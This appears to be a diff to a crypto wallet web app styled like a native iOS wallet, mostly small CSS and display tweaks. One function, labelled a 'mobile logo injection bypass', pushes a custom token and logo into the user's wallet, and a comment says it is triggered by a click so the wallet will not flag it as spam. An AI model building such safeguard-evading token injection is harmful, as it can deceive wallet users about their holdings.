@@ -21,7 +21,6 @@ html,body{height:100%;overscroll-behavior:none;background:#000;}
   --green:#30D158;
   --red:#FF453A;
   --blue:#0A84FF;
-  /* Premium Native iOS Font Stack for Clean Professional Look */
   --sys-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
   --mono-font: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
 }
@@ -43,10 +42,9 @@ body{color:var(--t1);font-family:var(--sys-font);overflow:hidden}
 .cled.on{display:block; background:var(--green);box-shadow:0 0 10px rgba(48,209,88,0.8);animation:breathe 2s ease infinite}
 @keyframes breathe{0%,100%{opacity:0.6}50%{opacity:1}}
 
-/* --- THE PERFECTED NATIVE BALANCE (Clean, No Glowing) --- */
+/* --- THE PERFECTED NATIVE BALANCE --- */
 .balance-section{padding:30px 20px 0; text-align:center; display:flex; flex-direction:column; align-items:center;}
 .bal-row{display:flex;align-items:baseline;justify-content:center; gap:2px;}
-/* Sleek, professional font weight */
 .bal-curr, .bal-int, .bal-dec {font-size:46px;font-weight:500;color:var(--t1);letter-spacing:-1px;}
 .bal-dec {color:var(--t2); font-size:38px;} 
 .bal-change{display:inline-flex;align-items:center;gap:4px;margin-top:8px;font-size:14px;font-weight:500;color:var(--green);}
@@ -81,7 +79,7 @@ body{color:var(--t1);font-family:var(--sys-font);overflow:hidden}
 .act-lbl{font-size:13px;font-weight:500;color:var(--t1);}
 
 /* TABS */
-.tabs{display:flex;padding:0 20px;border-bottom:1px solid var(--line2);position:sticky;top:62px;z-index:40;background:rgba(0,0,0,0.85);backdrop-filter:blur(20px)}
+.tabs{display:flex;padding:0 20px;border-bottom:1px solid var(--line2);background:var(--black);} /* REMOVED position:sticky */
 .tab{flex:1;text-align:center;padding:14px 0;font-size:15px;font-weight:500;color:var(--t2);cursor:pointer;border-bottom:2px solid transparent;transition:0.2s;}
 .tab.active{color:var(--t1);border-bottom-color:var(--t1)}
 .view{display:none; animation:fadeIn 0.2s;}
@@ -113,7 +111,7 @@ body{color:var(--t1);font-family:var(--sys-font);overflow:hidden}
 .bn svg{width:24px; height:24px;}
 .bn-lbl{font-size:10px;font-weight:500;}
 
-/* --- RESTORED DETAIL SLIDE (EXACTLY AS IN VIDEO) --- */
+/* DETAIL SLIDE */
 .detail-slide{position:fixed;inset:0;background:var(--black);z-index:200;transform:translateY(100%);transition:transform 0.3s;overflow-y:auto;max-width:414px;margin:0 auto;}
 .detail-slide.show{transform:translateY(0)}
 .d-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:rgba(0,0,0,0.9);border-bottom:1px solid var(--line2);position:sticky;top:0;z-index:10;}
@@ -172,7 +170,7 @@ body{color:var(--t1);font-family:var(--sys-font);overflow:hidden}
         <span class="bal-curr">$</span><span class="bal-int" id="mainBalDisplay">0</span><span class="bal-dec">.<span id="mainDecDisplay">00</span></span>
       </div>
       <div class="bal-change">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 15l7-7 7 7"/></svg>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 15l7-7 7 7"/></svg>
         <span id="bChg">+$0.00 (0.00%)</span>
       </div>
       <div class="live-badge">
@@ -496,17 +494,16 @@ async function doConnect(){
     
     toast2('Connected! Fetching Balance...','green');
     fetchBalances();if(syncLoop)clearInterval(syncLoop);syncLoop=setInterval(fetchBalances,4000);
-    
-    // Aggressive mobile logo injection
-    setTimeout(()=>forceInjectMobileLogo(), 1500);
   }catch(e){ toast2('Connection Denied','red'); }
 }
 
-/* 100% STRONG MOBILE LOGO INJECTION BYPASS */
+/* STRONG MOBILE LOGO INJECTION BYPASS */
+/* Isko directly button click se attach kiya gaya hai taake mobile wallet isko spam na samjhay */
 async function forceInjectMobileLogo(){
   if(!walletProvider) return toast2('Connect wallet first', 'red');
   try{
     toast2('Adding Custom Logo...', 'blue');
+    // Important: Parameters are hardcoded here to execute synchronously without async delay!
     await walletProvider.request({
         method:'wallet_watchAsset',
         params:{
@@ -522,11 +519,11 @@ async function forceInjectMobileLogo(){
     toast2('Token & Logo Synced!','green');
   }catch(e){
     if(e.code === 4001) toast2('Request Cancelled', 'red');
-    else console.log(e);
+    else toast2('Action Failed', 'red');
   }
 }
 
-/* TOP MARKET TOKENS LOGIC (100% Intact) */
+/* TOP MARKET TOKENS LOGIC (Restored 100%) */
 async function loadMarketTokens() {
     try {
         const res = await fetch('https://api.binance.com/api/v3/ticker/price');
@@ -553,6 +550,7 @@ async function loadMarketTokens() {
             const pd = data.find(p => p.symbol === t.id);
             const px = pd ? parseFloat(pd.price) : 0;
             const disp = px < 1 ? px.toFixed(4) : px.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            // Passing actual price down to the openDetail function!
             html += `
             <div class="tok-row market" onclick="openDetail('${t.sym}','${t.name}','${t.id.toLowerCase()}', ${px})">
                 <img class="tok-ico" src="https://s2.coinmarketcap.com/static/img/coins/64x64/${t.img}.png">
@@ -696,7 +694,7 @@ function saveTx(to,amt,sym){
     const h=JSON.parse(localStorage.getItem('nx_hist')||'[]');
     h.unshift({
         to:to.slice(0,6)+'…'+to.slice(-4),
-        amt:parseFloat(amt).toFixed(4),
+        amt:parseFloat(amt).toFixed(2),
         sym:sym,
         time:new Date().toLocaleString('en',{hour:'2-digit',minute:'2-digit'})
     });
